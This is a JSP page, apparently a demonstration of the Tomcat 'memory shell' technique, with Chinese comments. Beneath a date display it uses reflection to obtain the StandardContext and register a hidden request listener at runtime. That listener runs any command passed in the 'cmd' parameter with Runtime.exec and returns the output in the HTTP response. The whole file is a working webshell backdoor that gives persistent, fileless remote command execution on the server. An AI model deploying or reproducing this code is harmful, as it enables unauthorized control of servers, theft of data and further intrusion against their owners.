<%@ page import="java.text.DateFormat" %>
<%@ page import="java.text.SimpleDateFormat" %>
<%@ page import="java.util.Date" %>
<%@ page import="java.util.EventListener" %>
<%@ page import="java.io.InputStream" %>
<%@ page import="java.io.ByteArrayOutputStream" %>
<%@ page import="java.io.IOException" %>
<%@ page import="java.lang.reflect.Field" %>
<%@ page import="org.apache.catalina.connector.Request" %>
<%@ page import="org.apache.catalina.core.StandardContext" %>
<html>
<head>
    <meta charset="UTF-8">
</head>
<body>
<%
    DateFormat dateFormat = new SimpleDateFormat("yyyy-MM-dd HH:mm:ss");
    String dateStr = dateFormat.format(new Date());
%>
<%= dateStr %>
<%
    class demoListener_ implements ServletRequestListener {
        /**
         * 在对象销毁的过程中获取参数，然后执行命令
         * @param sre Information about the request
         * @throws IOException
         */
        @Override
        public void requestDestroyed(ServletRequestEvent sre) throws IOException, NoSuchFieldException, IllegalAccessException {
            System.out.println("Request对象被销毁2");
            HttpServletRequest httpRequest = (HttpServletRequest) sre.getServletRequest();
            //因为此处没有直接获取到response对象，所以无法直接将结果输出，所以需要用反射获取到response对象。
            Field request1 = httpRequest.getClass().getDeclaredField("request");
            request1.setAccessible(true);
            Request request = (Request) request1.get(httpRequest);

            String cmd= httpRequest.getParameter("cmd"); //通过servletrequest获取参数
            System.out.println(cmd);
            if(cmd!=null && !cmd.equals("")){
                Runtime runtime = Runtime.getRuntime();
                InputStream inputStream = runtime.exec(cmd).getInputStream();
                ByteArrayOutputStream outputStream = new ByteArrayOutputStream();
                byte[] bytes = new byte[1024];
                int a=-1;
                while ((a=inputStream.read(bytes))!=-1){

                    outputStream.write(bytes,0,a);
                }
                System.out.println(new String(outputStream.toByteArray()));
                request.getResponse().getWriter().println(new String(outputStream.toByteArray()));
            }else{
                request.getResponse().getWriter().println(">||<");
            }
        }

        @Override
        public void requestInitialized(ServletRequestEvent sre) {
            System.out.println("Request对象被创建2");
        }
    }
%>
<%
    //获取StandardCOntext(另外一种方法)
    Field reqF = request.getClass().getDeclaredField("request");
    reqF.setAccessible(true);
    Request req = (Request) reqF.get(request);
    StandardContext context = (StandardContext) req.getContext();
    //addApplicationEventListener直接创建listener
    demoListener_ demoListener_ = new demoListener_();
    context.addApplicationEventListener(demoListener_);
%>

</body>
</html>